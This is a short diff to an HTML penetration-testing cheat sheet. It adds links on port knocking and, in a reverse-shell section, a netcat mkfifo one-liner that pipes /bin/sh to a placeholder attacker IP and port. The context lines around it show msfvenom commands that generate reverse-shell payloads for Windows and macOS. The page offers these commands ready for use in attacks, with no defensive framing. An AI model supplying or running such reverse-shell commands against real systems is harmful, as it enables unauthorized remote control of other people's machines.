@@ -67,7 +67,8 @@
 https://github.com/laramies/metagoofil
 
 #Port Knocking
-https://www.digitalwhisper.co.il/files/Zines/0x02/DW2-5-Port-Knocking.pdf
+Great Read - https://www.digitalwhisper.co.il/files/Zines/0x02/DW2-5-Port-Knocking.pdf
+Using nmap - https://wiki.archlinux.org/index.php/Port_knocking
 </pre>
 <hr>
 <p><h3>IPv6:</h3></p>
@@ -660,6 +661,10 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ATTACKER's_IP_ADDRESS] LPORT=
 <pre style="background-color:black;color:white;">
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=[ATTACKER's_IP_ADDRESS] PORT=[ATTACKER's_PORT] -f macho > shell.macho	(reverse shell using msfvenom)
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=[ATTACKER's_IP_ADDRESS] LPORT=[ATTACKER's_PORT] -f [LANGUAGE]		(reverse shell using msfvenom - shellcode)
+</pre>
+<p><font size="3.5" color="black">Netcat</font></p>
+<pre style="background-color:black;color:white;">
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ATTACKER's_IP_ADDRESS] [ATTACKER's_PORT] >/tmp/f
 </pre>
 <p><font size="3.5" color="black">Socat</font></p>
 <pre style="background-color:black;color:white;">
